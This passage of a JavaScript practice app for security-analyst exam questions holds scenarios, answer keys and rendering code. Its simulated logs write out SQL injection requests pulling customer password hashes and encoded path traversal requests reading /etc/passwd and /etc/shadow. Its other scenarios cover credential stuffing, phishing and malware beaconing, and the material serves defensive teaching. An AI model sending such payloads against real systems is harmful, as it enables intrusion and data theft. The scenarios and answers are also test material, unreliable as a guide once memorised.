evidence survives. Blocking the 404 scanner addresses an attacker who did nothing, extra logging fixes nothing, and renaming a folder changes one URL."}]},{"id":"web-logs","obj":"2.4","objs":["2.4"],"pts":8,"title":"Three Servers, Three Attacks","sc":"Three customer-facing web applications each logged something unusual overnight. You have an access-log excerpt from each. Development needs to know what each attack was and what code or configuration change stops it.","task":"For each server, identify the attack and the control that addresses its root cause, then answer the two follow-up questions.","ev":[{"k":"log","l":"shop","c":"shop.harborline.example — access.log","b":"203.0.113.50 - - [24/Oct/2026:01:02:11 +0000] &quot;GET /product.php?id=14 HTTP/1.1&quot; 200 2310 &quot;-&quot; &quot;Mozilla/5.0&quot;\n203.0.113.50 - - [24/Oct/2026:01:02:19 +0000] &quot;GET /product.php?id=14%27 HTTP/1.1&quot; 500 512 &quot;-&quot; &quot;Mozilla/5.0&quot;\n203.0.113.50 - - [24/Oct/2026:01:03:02 +0000] &quot;GET /product.php?id=14%20ORDER%20BY%204-- HTTP/1.1&quot; 500 512 &quot;-&quot; &quot;Mozilla/5.0&quot;\n203.0.113.50 - - [24/Oct/2026:01:03:09 +0000] &quot;GET /product.php?id=14%20ORDER%20BY%203-- HTTP/1.1&quot; 200 2310 &quot;-&quot; &quot;Mozilla/5.0&quot;\n203.0.113.50 - - [24/Oct/2026:01:04:40 +0000] &quot;GET /product.php?id=-1%20UNION%20SELECT%20username,password_hash,email%20FROM%20customers-- HTTP/1.1&quot; 200 48211 &quot;-&quot; &quot;Mozilla/5.0&quot;"},{"k":"log","l":"portal","c":"portal.harborline.example — access.log","b":"198.51.100.9 - - [24/Oct/2026:02:11:05 +0000] &quot;GET /download?file=report-q3.pdf HTTP/1.1&quot; 200 88412 &quot;-&quot; &quot;Mozilla/5.0&quot;\n198.51.100.9 - - [24/Oct/2026:02:11:31 +0000] &quot;GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1&quot; 200 1844 &quot;-&quot; &quot;Mozilla/5.0&quot;\n198.51.100.9 - - [24/Oct/2026:02:12:02 +0000] &quot;GET /download?file=..%2F..%2Fapp%2Fconfig%2Fdatabase.yml HTTP/1.1&quot; 200 640 &quot;-&quot; &quot;Mozilla/5.0&quot;\n198.51.100.9 - - [24/Oct/2026:02:12:30 +0000] &quot;GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1&quot; 500 512 &quot;-&quot; &quot;Mozilla/5.0&quot;"},{"k":"log","l":"account","c":"account.harborline.example — access.log","b":"192.0.2.18   - - [24/Oct/2026:03:40:01 +0000] &quot;POST /api/login HTTP/1.1&quot; 401 61 &quot;-&quot; &quot;python-requests/2.32.3&quot;\n198.51.100.71 - - [24/Oct/2026:03:40:01 +0000] &quot;POST /api/login HTTP/1.1&quot; 401 61 &quot;-&quot; &quot;python-requests/2.32.3&quot;\n203.0.113.94 - - [24/Oct/2026:03:40:02 +0000] &quot;POST /api/login HTTP/1.1&quot; 401 61 &quot;-&quot; &quot;python-requests/2.32.3&quot;\n192.0.2.203  - - [24/Oct/2026:03:40:02 +0000] &quot;POST /api/login HTTP/1.1&quot; 401 61 &quot;-&quot; &quot;python-requests/2.32.3&quot;\n  ... 4,180 POST /api/login from 611 distinct addresses, 03:40:01-04:12:55,\n      each address trying 6-8 different usernames, one password each ...\n198.51.100.140 - - [24/Oct/2026:03:51:27 +0000] &quot;POST /api/login HTTP/1.1&quot; 200 412 &quot;-&quot; &quot;python-requests/2.32.3&quot;\n203.0.113.12  - - [24/Oct/2026:04:02:44 +0000] &quot;POST /api/login HTTP/1.1&quot; 200 409 &quot;-&quot; &quot;python-requests/2.32.3&quot;"}],"q":[{"k":"match","o":"2.4","p":"Identify the attack against each server.","ch":["SQL injection","Directory traversal","Cross-site scripting","Credential stuffing","No attack evident"],"it":[{"t":"shop","a":0,"w":"A stray quote produces a database error (500), ORDER BY probes find the column count, and a UNION SELECT pulls from the customers table. That is the textbook sequence for union-based SQL injection."},{"t":"portal","a":1,"w":"Encoded ../ sequences climb out of the download folder to /etc/passwd and the application&#x27;s own database config. The 500 on /etc/shadow only means the web process could not read that one file."},{"t":"account","a":3,"w":"Hundreds of addresses each try a handful of usernames with one password apiece: leaked username-password pairs replayed at scale. Brute force hammers one account; spraying tries one password across many accounts. Two 200 responses mean two accounts were taken over."}],"sh":false},{"k":"match","o":"2.4","p":"Choose the control that addresses each root cause.","ch":["Parameterized queries (prepared statements)","Canonicalize the path and allow only listed file names","Encode output and set a Content-Security-Policy","MFA plus rate limiting and bot detection on login","Block the source IP addresses"],"it":[{"t":"shop","a":0,"w":"Binding id as a parameter means the database never treats it as SQL, whatever characters it contains. A WAF rule helps at the edge, but the fix belongs in the code."},{"t":"portal","a":1,"w":"Resolve the requested path first, then confirm it is still inside the download directory, or better, map an ID to a known file. Filtering the literal string ../ fails against encodings like %2F."},{"t":"account","a":3,"w":"A correct password from a breach is useless without the second factor, and per-account and per-fingerprint limits slow the replay. Force a reset on the two compromised accounts too."}],"sh":false},{"k":"select","o":"2.4","p":"On shop, what in the log shows the UNION query returned data?","opt":["The response size jumped from about 2.3 KB to 48 KB with status 200","The request used GET rather than POST","The earlier requests returned 500","The user agent is a normal browser string"],"a":0,"fx":false,"w":"Access logs do not show response bodies, so size is your best proxy. A normal product page is 2310 bytes; the UNION request returned 48211 bytes with a 200, which fits a page padded with rows from the customers table. Treat those records as exposed."},{"k":"select","o":"2.4","p":"Why would blocking source addresses do little against the account attack?","opt":["The requests come from hundreds of addresses, each sending only a few","All the source addresses are internal","The attacker used HTTPS, so addresses are hidden","Blocking IPs violates the logging policy"],"a":0,"fx":false,"w":"Credential stuffing runs through large proxy pools on purpose. Six or eight attempts per address stays under any per-IP threshold, and a block list chases addresses the attacker will discard anyway."}]},{"id":"invoice-incident","obj":"3.2","objs":["3.1","3.2"],"pts":7,"title":"The Remittance Invoice","sc":"An accounts-payable workstation, FIN-WS07 (user A. Hart), began beaconing on Monday morning. The incident lead has assembled four evidence sources and needs the key facts for the timeline, then a control for each stage of the attack so it cannot repeat.","task":"Part 1: identify the malware executable, the command-and-control address and when the executable entered the organization. Part 2: pick one control per kill chain stage. Each control fits one stage; two will not be used.","ev":[{"k":"log","l":"Mail gateway","c":"","b":"2026-03-09 08:41:12  msg-id 7f3a19c2\n  from:     billing@northgate-supp1y.example  (sending host 192.0.2.150)\n  to:       accounts@harborline.example\n  subject:  Remittance overdue - INV-20931\n  attach:   Remittance_INV-20931.zip (password-protected, 3 KB)\n  scan:     archive encrypted - contents not inspected\n  verdict:  DELIVERED"},{"k":"table","l":"Proxy","cap":"","m":true,"h":["Time","Client","Method","URL","Status","Type / bytes"],"r":[["2026-03-09 08:52:40","FIN-WS07","GET","http://198.51.100.84/dl/rmt.bin","200","application/octet-stream 412,880"],["2026-03-09 08:58:02","FIN-WS07","POST","https://198.51.100.84/api/v2/ping","200","text/plain 214"],["2026-03-09 09:03:02","FIN-WS07","POST","https://198.51.100.84/api/v2/ping","200","text/plain 214"],["2026-03-09 09:08:02","FIN-WS07","POST","https://198.51.100.84/api/v2/ping","200","text/plain 214"]]},{"k":"table","l":"EDR","cap":"","m":true,"h":["Time","Event","Detail"],"r":[["08:52:31","Archive extracted","Remittance_INV-20931.zip → Remittance_INV-20931.pdf.js"],["08:52:38","Process created","wscript.exe &quot;C:\\Users\\ahart\\Downloads\\Remittance_INV-20931.pdf.js&quot;"],["08:52:44","File written","C:\\ProgramData\\RmtSync\\rmtsync.exe (by wscript.exe)"],["08:52:46","Process created","C:\\ProgramData\\RmtSync\\rmtsync.exe"],["08:53:02","Registry set","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RmtSync"]]},{"k":"table","l":"File integrity","cap":"","m":true,"h":["Action","Object","Path","Who","When"],"r":[["Added","File","C:\\Users\\ahart\\Downloads\\Remittance_INV-20931.zip","ahart","2026-03-09 08:47:55"],["Added","Folder","C:\\ProgramData\\RmtSync","ahart","2026-03-09 08:52:44"],["Added","File","C:\\ProgramData\\RmtSync\\rmtsync.exe","ahart","2026-03-09 08:52:44"],["Modified","Registry","HKCU\\...\\CurrentVersion\\Run","ahart","2026-03-09 08:53:02"]]}],"q":[{"k":"select","o":"3.2","p":"What is the malware executable called on the host?","opt":["rmtsync.exe","wscript.exe","Remittance_INV-20931.pdf.js","Remittance_INV-20931.zip"],"a":0,"fx":false,"w":"rmtsync.exe is the persistent executable: written to ProgramData, run, then registered in the Run key. The .pdf.js file is a script dropper with a double extension, wscript.exe is the legitimate Windows script host it abused, and the zip is the delivery container."},{"k":"select","o":"3.2","p":"What is the command-and-control address?","opt":["198.51.100.84","192.0.2.150","10.20.4.57","203.0.113.77"],"a":0,"fx":false,"w":"FIN-WS07 posts to 198.51.100.84 every five minutes in small, identical requests, which is beaconing. 192.0.2.150 sent the email; it belongs in the IOC list, but it is delivery infrastructure, not C2."},{"k":"select","o":"3.2","p":"When did the malware executable enter the organization?","opt":["2026-03-09 08:52:40","2026-03-09 08:41:12","2026-03-09 08:52:44","2026-03-09 08:53:02"],"a":0,"fx":false,"w":"The email at 08:41 carried a script, not the executable; the gateway could not even look inside the encrypted archive. The executable crossed the boundary when the script fetched rmt.bin through the proxy at 08:52:40. 08:52:44 is when it was written to disk under its new name, and 08:53:02 is persistence."},{"k":"match","o":"3.1","p":"Part 2 — choose one control per stage.","ch":["Quarantine password-protected archives from external senders","Make Notepad the default handler for .js and .vbs files","Application allowlisting that blocks executables in ProgramData and user folders","Proxy policy that blocks downloads and connections to raw IP addresses","Longer minimum password length","Full-disk encryption on finance laptops"],"it":[{"t":"Delivery","a":0,"w":"The gateway delivered an archive it could not inspect. Encrypted attachments from outside are a known evasion; holding them for review removes the blind spot."},{"t":"Exploitation","a":1,"w":"Double-clicking the .js file ran it in wscript.exe. With Notepad as the handler, the same click opens a text file and nothing executes."},{"t":"Installation","a":2,"w":"rmtsync.exe was written to and launched from ProgramData. Allowlisting stops unknown binaries running from user-writable paths, so the payload never starts and never reaches its Run key."},{"t":"Command and Control","a":3,"w":"Both the download and the beacon went to a bare IP rather than a named site. Legitimate business traffic almost never does that, so a proxy rule breaks the second-stage fetch and the C2 channel."}],"sh":false}]},{"id":"phish-blast","obj":"1.3","objs":["1.2","1.3","3.2"],"pts":5,"title":"Phishing Blast Review","sc":"At 08:58 a phishing email reached ten Rivermark staff. The SOC added the domain to the proxy block list at 09:24. The CISO wants the blast radius in numbers before the 10:00 bridge call.","task":"Read the email and the three logs, then report how many people clicked, how many workstations were infected, the malware&#x27;s file name, and who gave away a password.","ev":[{"k":"doc","l":"Email","f":[["From","&quot;Rivermark IT Service Desk&quot; &lt;servicedesk@it-helpdesk-portal.net&gt;"],["Reply-To","rivermark-support@freemail.example"],["To","undisclosed-recipients"],["Subject","Action required: mailbox migration tonight"],["Received","from mail.it-helpdesk-portal.net (203.0.113.200)"],["Auth-Results","spf=pass smtp.mailfrom=it-helpdesk-portal.net; dkim=pass header.d=it-helpdesk-portal.net; dmarc=pass"]],"p":["Your mailbox is scheduled to move to the new server tonight. Accounts that are not confirmed by 10:00 will be suspended.","Confirm your account at http://it-helpdesk-portal.net/reset and install the PortalUpdate tool from the same page so Outlook keeps working after the move."]},{"k":"table","l":"Staff","cap":"","m":false,"h":["User","Workstation","IP"],"r":[["jdiaz","WS-101","10.1.4.21"],["kpatel","WS-104","10.1.4.24"],["lnguyen","WS-107","10.1.4.27"],["mreed","WS-110","10.1.4.30"],["tokafor","WS-113","10.1.4.33"],["sgarcia","WS-116","10.1.4.36"],["bwong","WS-119","10.1.4.39"],["rcole","WS-122","10.1.4.42"],["arivera","WS-125","10.1.4.45"],["ckim","WS-128","10.1.4.48"]]},{"k":"table","l":"Proxy","cap":"Domain added to the block list at 09:24:00","m":true,"h":["Time","Client","Method","URL","Status","Action"],"r":[["09:14:02","10.1.4.21","GET","it-helpdesk-portal.net/reset","200","allowed"],["09:14:09","10.1.4.21","GET","it-helpdesk-portal.net/files/PortalUpdate.exe","200","allowed"],["09:15:30","10.1.4.27","GET","it-helpdesk-portal.net/reset","200","allowed"],["09:15:41","10.1.4.27","GET","it-helpdesk-portal.net/files/PortalUpdate.exe","200","allowed"],["09:16:20","10.1.4.24","GET","intranet.rivermark.example/it/mail-migration","200","allowed"],["09:17:12","10.1.4.30","GET","it-helpdesk-portal.net/reset","200","allowed"],["09:17:40","10.1.4.30","POST","it-helpdesk-portal.net/reset/submit","302","allowed"],["09:19:40","10.1.4.33","GET","it-helpdesk-portal.net/reset","200","allowed"],["09:19:52","10.1.4.33","GET","it-helpdesk-portal.net/files/PortalUpdate.exe","200","allowed"],["09:22:05","10.1.4.21","GET","it-helpdesk-portal.net/reset","200","allowed"],["09:26:10","10.1.4.42","GET","it-helpdesk-portal.net/reset","403","blocked"],["09:31:55","10.1.4.39","GET","it-helpdesk-portal.net/reset","403","blocked"],["09:33:20","10.1.4.42","GET","it-helpdesk-portal.net/reset","403","blocked"]]},{"k":"table","l":"EDR","cap":"","m":true,"h":["Time","Host","Event","Detail","Result"],"r":[["09:14:15","WS-101","Process created","C:\\Users\\jdiaz\\Downloads\\PortalUpdate.exe","allowed"],["09:14:18","WS-101","Persistence","Scheduled task &quot;PortalUpdate&quot; created","allowed"],["09:15:47","WS-107","Process blocked","C:\\Users\\lnguyen\\Downloads\\PortalUpdate.exe","blocked, quarantined"],["09:20:01","WS-113","Process created","C:\\Users\\tokafor\\Downloads\\PortalUpdate.exe","allowed"],["09:20:03","WS-113","Persistence","Service &quot;PortalUpdSvc&quot; installed","allowed"],["09:40:10","WS-104","Process created","C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","allowed"]]}],"q":[{"k":"text","o":"3.2","p":"How many employees clicked the link?","a":["6","six"],"ph":"number","w":"Count distinct people, not requests: jdiaz (.21), lnguyen (.27), mreed (.30), tokafor (.33), rcole (.42) and bwong (.39). jdiaz and rcole each appear twice. rcole and bwong were blocked, but they still clicked, and they need the same awareness follow-up. kpatel visited the genuine intranet notice, which is the behavior you want.","show":"6"},{"k":"text","o":"3.2","p":"On how many workstations was the malware installed?","a":["2","two"],"ph":"number","w":"WS-101 and WS-113 ran PortalUpdate.exe and each created persistence. WS-107 downloaded it too, but EDR blocked and quarantined it before it ran. Three downloads, two infections.","show":"2"},{"k":"text","o":"1.2","p":"What is the executable file name of the malware?","a":["portalupdate.exe"],"ph":"file name","w":"PortalUpdate.exe, delivered from /files/ on the phishing site and launched from each user&#x27;s Downloads folder.","show":"portalupdate.exe"},{"k":"select","o":"3.2","p":"Who submitted credentials to the phishing page?","opt":["mreed","jdiaz","tokafor","kpatel"],"a":0,"fx":false,"w":"Only 10.1.4.30 sent a POST to /reset/submit, and the 302 that followed is the typical redirect after a harvested form. mreed never downloaded the tool, so this is a credential case, not a malware case: reset the password and revoke that user&#x27;s sessions."},{"k":"select","o":"1.3","p":"SPF, DKIM and DMARC all passed. What does that tell you?","opt":["Only that the attacker controls it-helpdesk-portal.net; the domain is not Rivermark&#x27;s, which is the real indicator","The message really came from Rivermark IT","The gateway checks failed open and should be ignored","The Reply-To address was verified as safe"],"a":0,"fx":false,"w":"Email authentication proves a message came from servers allowed to send for the domain in question. An attacker who registers a lookalike domain can pass all three. Read what the domain is: it is not rivermark.example, and the Reply-To points to a free mail service."}]}];
+var OBJ = {"1.1": "System and network architecture", "1.2": "Indicators of malicious activity", "1.3": "Tools and techniques to determine malicious activity", "1.4": "Threat intelligence and threat hunting", "1.5": "Efficiency and process improvement", "2.1": "Vulnerability scanning methods and concepts", "2.2": "Analyze output from vulnerability assessment tools", "2.3": "Analyze data to prioritize vulnerabilities", "2.4": "Controls to mitigate attacks and software vulnerabilities", "2.5": "Vulnerability response, handling and management", "3.1": "Attack methodology frameworks", "3.2": "Incident response activities", "3.3": "Preparation and post-incident activity", "4.1": "Vulnerability management reporting and communication", "4.2": "Incident response reporting and communication"};
 
 var KEY = "cysa:pbq:v1";
 var st = {best:{}, objStats:{}};
 try{ var raw = localStorage.getItem(KEY); if(raw) st = JSON.parse(raw) || st; }catch(e){}
+if(!st || typeof st !== 'object') st = {best:{}, objStats:{}};
 if(!st.best) st.best = {}; if(!st.objStats) st.objStats = {};
 function save(){ try{ localStorage.setItem(KEY, JSON.stringify(st)); }catch(e){} }
+function bestGot(b){ if(!b) return null; return (typeof b.got === 'number') ? b.got : ((b.order||0) + (b.match||0)); }
 
+function $(id){ return document.getElementById(id); }
 function shuffle(a){ a=a.slice(); for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;} return a; }
+function range(n){ var r=[]; for(var i=0;i<n;i++) r.push(i); return r; }
+function escT(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function norm(s){ return String(s||'').trim().toLowerCase().replace(/\s+/g,' ').replace(/\.$/,''); }
+function each(nodes, fn){ Array.prototype.forEach.call(nodes, fn); }
 
-PBQS.forEach(function(p){ render(p); });
+var BYID = {}; PBQS.forEach(function(p){ BYID[p.id] = p; });
+var RUN = {};   // per-PBQ working state, kept while the page is open
 
-function render(p){
-  var host = document.getElementById('pbq-' + p.id);
-  var order = shuffle(p.order);
-  var ev = shuffle(p.ev);
-  var checked = false;
-
-  function draw(){
-    var h = '<div class="scenario">' + p.scenario + '</div>'
-          + '<p class="task">' + p.task + '</p>'
-          + '<p class="steplabel">Step 1 &mdash; sequence the stages</p><ol class="stages" id="ol-'+p.id+'">';
-    order.forEach(function(s, i){
-      var cls = '';
-      if(checked) cls = (s === p.order[i]) ? ' class="right"' : ' class="wrong"';
-      h += '<li'+cls+'><span class="sname">'+s+'</span>'
-         + '<button class="move" data-i="'+i+'" data-d="-1" aria-label="Move '+s+' up"'+(i===0?' disabled':'')+'>&uarr;</button>'
-         + '<button class="move" data-i="'+i+'" data-d="1" aria-label="Move '+s+' down"'+(i===order.length-1?' disabled':'')+'>&darr;</button></li>';
-    });
-    h += '</ol><p class="steplabel">Step 2 &mdash; attribute each artifact</p>';
-    ev.forEach(function(e, i){
-      var picked = e.pick || '';
-      var cls = '';
-      if(checked) cls = (picked === e.s) ? ' right' : ' wrong';
-      h += '<div class="ev'+cls+'"><p>'+e.t+'</p><select data-i="'+i+'"'+(checked?' disabled':'')+'>'
-         + '<option value="">Select a stage&hellip;</option>';
-      p.order.forEach(function(s){
-        h += '<option value="'+s+'"'+(picked===s?' selected':'')+'>'+s+'</option>';
-      });
-      h += '</select>';
-      if(checked) h += '<div class="why"><b>'+(picked===e.s?'Correct — '+e.s:'Answer: '+e.s)+'</b>'+e.w+'</div>';
-      h += '</div>';
-    });
-    h += '<div class="btnrow">'
-       + (checked ? '<button class="btn primary" id="again-'+p.id+'">Try again</button>'
-                  : '<button class="btn primary" id="check-'+p.id+'">Check my answers</button>')
-       + '</div><div class="score" id="score-'+p.id+'"></div>';
-    host.innerHTML = h;
-
-    Array.prototype.forEach.call(host.querySelectorAll('.move'), function(b){
-      b.onclick = function(){
-        if(checked) return;
-        var i = +b.getAttribute('data-i'), d = +b.getAttribute('data-d'), j = i + d;
-        if(j < 0 || j >= order.length) return;
-        var t = order[i]; order[i] = order[j]; order[j] = t;
-        draw();
-      };
-    });
-    Array.prototype.forEach.call(host.querySelectorAll('select'), function(s){
-      s.onchange = function(){ ev[+s.getAttribute('data-i')].pick = s.value; };
-    });
-    var c = document.getElementById('check-'+p.id);
-    if(c) c.onclick = function(){ checked = true; score(); draw(); };
-    var a = document.getElementById('again-'+p.id);
-    if(a) a.onclick = function(){ checked=false; order=shuffle(p.order); ev=shuffle(p.ev);
-                                  ev.forEach(function(x){ x.pick=''; }); draw(); };
-    drawScore();
-  }
-
-  function score(){
-    var o = 0; order.forEach(function(s,i){ if(s===p.order[i]) o++; });
-    var m = 0; ev.forEach(function(e){ if(e.pick===e.s) m++; });
-    var total = p.order.length + p.ev.length;
-    var got = o + m;
-    var b = st.best[p.id];
-    if(!b || got > (b.order + b.match)) st.best[p.id] = {order:o, match:m, total:total};
-    var os = st.objStats[p.obj] || {c:0, t:0};
-    os.c += got; os.t += total; st.objStats[p.obj] = os;
-    save();
-    p._last = {o:o, m:m, total:total};
-  }
-
-  function drawScore(){
-    var el = document.getElementById('score-'+p.id);
-    if(!el) return;
-    var b = st.best[p.id];
-    var txt = '';
-    if(p._last) txt += 'This attempt: ' + p._last.o + ' / ' + p.order.length + ' in order, '
-                     + p._last.m + ' / ' + p.ev.length + ' attributed. ';
-    txt += b ? 'Best: ' + (b.order + b.match) + ' / ' + b.total + '.'
-             : 'Not attempted yet.';
-    el.textContent = txt;
-  }
-
-  draw();
+function fresh(p){
+  var r = {ans:{}, perm:{}, ord:{}, items:{}, checked:false, tab:0, term:{}, hist:[], last:null};
+  p.q.forEach(function(q, i){
+    if(q.k === 'select' || q.k === 'multi') r.perm[i] = q.fx ? range(q.opt.length) : shuffle(range(q.opt.length));
+    if(q.k === 'order'){ var o; do { o = shuffle(q.it); } while(o.join('|') === q.it.join('|')); r.ord[i] = o; }
+    if(q.k === 'match') r.items[i] = q.sh ? shuffle(range(q.it.length)) : range(q.it.length);
+    if(q.k === 'multi') r.ans[i] = [];
+    if(q.k === 'grid') r.ans[i] = q.rows.map(function(){ return q.cols.map(function(){ return false; }); });
+    if(q.k === 'match') r.ans[i] = {};
+  });
+  return r;
 }
+function run(p){ if(!RUN[p.id]) RUN[p.id] = fresh(p); return RUN[p.id]; }
+
+/* ---------- accuracy strip and picker ---------- */
+function drawAcc(){
+  var keys = Object.keys(st.objStats).filter(function(k){ return st.objStats[k].t > 0; }).sort();
+  var el = $('acc');
+  if(!keys.length){ el.innerHTML = '<span class="none">No tasks checked yet. Accuracy appears here per objective after your first attempt.</span>'; return; }
+  el.innerHTML = keys.map(function(k){
+    var s = st.objStats[k], pct = Math.round(100*s.c/s.t);
+    return '<span class="chip" title="'+escT(OBJ[k]||'')+'"><b>'+k+'</b> '+pct+'% &middot; '+s.c+'/'+s.t+'</span>';
+  }).join('');
+}
+function drawPicker(cur){
+  $('picker').innerHTML = PBQS.map(function(p){
+    var b = st.best[p.id], g = bestGot(b);
+    var stat = (g === null) ? '<span>Not attempted</span>'
+             : '<span class="'+(g===b.total?'done':'')+'">Best '+g+'/'+b.total+'</span>';
+    return '<button class="pick" type="button" data-id="'+p.id+'" aria-current="'+(p.id===cur)+'">'
+         + '<span class="pt">'+p.title+'</span>'
+         + '<span class="pm"><span>'+p.objs.join(' &middot; ')+'</span>'+stat+'</span></button>';
+  }).join('');
+  each($('picker').querySelectorAll('.pick'), function(b){
+    b.onclick = function(){ open(b.getAttribute('data-id'), true); };
+  });
+}
+
+/* ---------- task ---------- */
+var CUR = null;
+function open(id, scroll){
+  if(!BYID[id]) id = PBQS[0].id;
+  CUR = id; st.open = id; save();
+  try{ if(location.hash.slice(1) !== id) history.replaceState(null, '', '#'+id); }catch(e){}
+  drawPicker(id);
+  drawTask(BYID[id]);
+  if(scroll){ var t = $('task'); if(t && t.scrollIntoView) t.scrollIntoView({block:'start'}); }
+}
+
+function drawTask(p){
+  var r = run(p);
+  var hasEv = p.ev.length > 0;
+  var h = '<div class="thead"><h2>'+p.title+'</h2><div class="tags">'
+        + p.objs.map(function(o){ return '<span class="tag" title="'+escT(OBJ[o]||'')+'">Objective '+o+'</span>'; }).join('')
+        + '</div></div>'
+        + '<div class="scenario">'+p.sc+'</div><p class="instr">'+p.task+'</p>'
+        + '<div class="split'+(hasEv?' two':'')+'">';
+  if(hasEv){
+    h += '<section class="evpane" aria-label="Evidence"><div class="tabs" role="tablist">';
+    p.ev.forEach(function(e, i){
+      h += '<button class="tab" type="button" role="tab" id="tab-'+p.id+'-'+i+'" aria-selected="'+(i===r.tab)+'" data-i="'+i+'">'+e.l+'</button>';
+    });
+    h += '</div><div class="evbody" id="evbody" role="tabpanel"></div></section>';
+  }
+  h += '<section class="qpane" id="qpane" aria-label="Questions"></section></div>';
+  $('task').innerHTML = h;
+  if(hasEv){
+    each($('task').querySelectorAll('.tab'), function(b){
+      b.onclick = function(){ r.tab = +b.getAttribute('data-i');
+        each($('task').querySelectorAll('.tab'), function(x){ x.setAttribute('aria-selected', String(x===b)); });
+        drawEvidence(p); };
+    });
+    drawEvidence(p);
+  }
+  drawQuestions(p);
+}
+
+function drawEvidence(p){
+  var r = run(p), e = p.ev[r.tab], body = $('evbody'), h = '';
+  if(e.k === 'log'){
+    if(e.c) h += '<p class="cmd">'+e.c+'</p>';
+    h += '<pre class="out">'+e.b+'</pre>';
+  } else if(e.k === 'table'){
+    if(e.cap) h += '<p class="cap">'+e.cap+'</p>';
+    h += '<div class="tblwrap"><table class="ev'+(e.m?' mono':'')+'"><thead><tr>'
+       + e.h.map(function(x){ return '<th>'+x+'</th>'; }).join('') + '</tr></thead><tbody>'
+       + e.r.map(function(row){ return '<tr>'+row.map(function(x){ return '<td>'+x+'</td>'; }).join('')+'</tr>'; }).join('')
+       + '</tbody></table></div>';
+  } else if(e.k === 'doc'){
+    h += '<div class="doc">';
+    if(e.f.length) h += '<dl>' + e.f.map(function(f){ return '<dt>'+f[0]+'</dt><dd>'+f[1]+'</dd>'; }).join('') + '</dl>';
+    h += e.p.map(function(x){ return '<p>'+x+'</p>'; }).join('') + '</div>';
+  } else if(e.k === 'terminal'){
+    var key = r.tab;
+    if(!r.term[key]) r.term[key] = ['<pre class="dim">'+e.bn+'</pre>'];
+    h += '<div class="term"><div class="scroll" id="tscroll">'+r.term[key].join('')+'</div>'
+       + '<form id="tform" autocomplete="off"><span class="ps">'+e.pr+'</span>'
+       + '<input id="tin-'+p.id+'" type="text" spellcheck="false" autocapitalize="off" aria-label="Console command" placeholder="nmap -sV -sC srv1.hq.lab"></form></div>';
+  }
+  body.innerHTML = h;
+  if(e.k === 'terminal') wireTerm(p, e);
+}
+
+function termRun(e, cmd){
+  var c = cmd.trim().replace(/\s+/g,' ');
+  if(c === '') return null;
+  if(c === 'help') return e.hp;
+  var lists = [e.cm, e.ms];
+  for(var L=0; L<lists.length; L++){
+    for(var i=0; i<lists[L].length; i++){
+      var m = lists[L][i].m;
+      for(var j=0; j<m.length; j++){ if(new RegExp(m[j], 'i').test(c)) return lists[L][i].o; }
+    }
+  }
+  return escT(c.split(' ')[0]) + ': command not found (type help)';
+}
+
+function wireTerm(p, e){
+  var r = run(p), key = r.tab, sc = $('tscroll'), inp = $('tin-'+p.id), hp = r.hist.length;
+  sc.scrollTop = sc.scrollHeight;
+  $('tform').onsubmit = function(ev){
+    ev.preventDefault();
+    var cmd = inp.value; inp.value = '';
+    if(cmd.trim()){ r.hist.push(cmd); } hp = r.hist.length;
+    if(cmd.trim() === 'clear'){ r.term[key] = []; sc.innerHTML = ''; return; }
+    var out = termRun(e, cmd);
+    var add = '<pre><span class="ps">'+e.pr+'</span> '+escT(cmd)+'</pre>' + (out === null ? '' : '<pre>'+out+'</pre>');
+    r.term[key].push(add);
+    sc.insertAdjacentHTML('beforeend', add);
+    sc.scrollTop = sc.scrollHeight;
+  };
+  inp.onkeydown = function(ev){
+    if(ev.key === 'ArrowUp' && hp > 0){ hp--; inp.value = r.hist[hp]; ev.preventDefault(); }
+    else if(ev.key === 'ArrowDown'){ if(hp < r.hist.length-1){ hp++; inp.value = r.hist[hp]; } else { hp = r.hist.length; inp.value = ''; } ev.preventDefault(); }
+  };
+}
+
+/* ---------- questions ---------- */
+function qid(p, i, s){ return 'q-'+p.id+'-'+i+(s===undefined?'':'-'+s); }
+
+function marks(p){   // [{i, ok, o}] one per scored field
+  var r = run(p), m = [];
+  p.q.forEach(function(q, i){
+    var a = r.ans[i];
+    if(q.k === 'select') m.push({i:i, ok: a !== undefined && a !== '' && +a === q.a, o:q.o});
+    else if(q.k === 'text') m.push({i:i, ok: q.a.indexOf(norm(a)) >= 0, o:q.o});
+    else if(q.k === 'multi') m.push({i:i, ok: a.slice().sort(function(x,y){return x-y;}).join(',') === q.a.join(','), o:q.o});
+    else if(q.k === 'grid') q.rows.forEach(function(_, ri){
+      m.push({i:i, ok: q.a[ri].every(function(v, ci){ return v === a[ri][ci]; }), o:q.o}); });
+    else if(q.k === 'order') r.ord[i].forEach(function(s, pi){ m.push({i:i, ok: s === q.it[pi], o:q.o}); });
+    else if(q.k === 'match') q.it.forEach(function(it, ii){ m.push({i:i, ok: a[ii] !== undefined && a[ii] !== '' && +a[ii] === it.a, o:q.o}); });
+  });
+  return m;
+}
+
+function unanswered(p){
+  var r = run(p), n = 0;
+  p.q.forEach(function(q, i){
+    var a = r.ans[i];
+    if(q.k === 'select' && (a === undefined || a === '')) n++;
+    else if(q.k === 'text' && !norm(a)) n++;
+    else if(q.k === 'multi' && !a.length) n++;
+    else if(q.k === 'match') q.it.forEach(function(_, ii){ if(a[ii] === undefined || a[ii] === '') n++; });
+  });
+  return n;
+}
+
+function why(ok, label, text){ return '<div class="why"><b>'+(ok ? 'Correct' : 'Answer: '+label)+'</b>'+text+'</div>'; }
+
+function drawQuestions(p, focusSel){
+  var r = run(p), C = r.checked, h = '';
+  p.q.forEach(function(q, i){
+    var a = r.ans[i], cls = '', inner = '';
+    if(q.k === 'select'){
+      var ok = C && a !== undefined && a !== '' && +a === q.a;
+      if(C) cls = ok ? ' right' : ' wrong';
+      inner = '<select id="'+qid(p,i)+'" data-i="'+i+'"'+(C?' disabled':'')+'><option value="">Choose&hellip;</option>'
+        + r.perm[i].map(function(oi){ return '<option value="'+oi+'"'+(String(a)===String(oi)?' selected':'')+'>'+q.opt[oi]+'</option>'; }).join('')
+        + '</select>' + (C ? why(ok, q.opt[q.a], q.w) : '');
+    } else if(q.k === 'text'){
+      var okt = C && q.a.indexOf(norm(a)) >= 0;
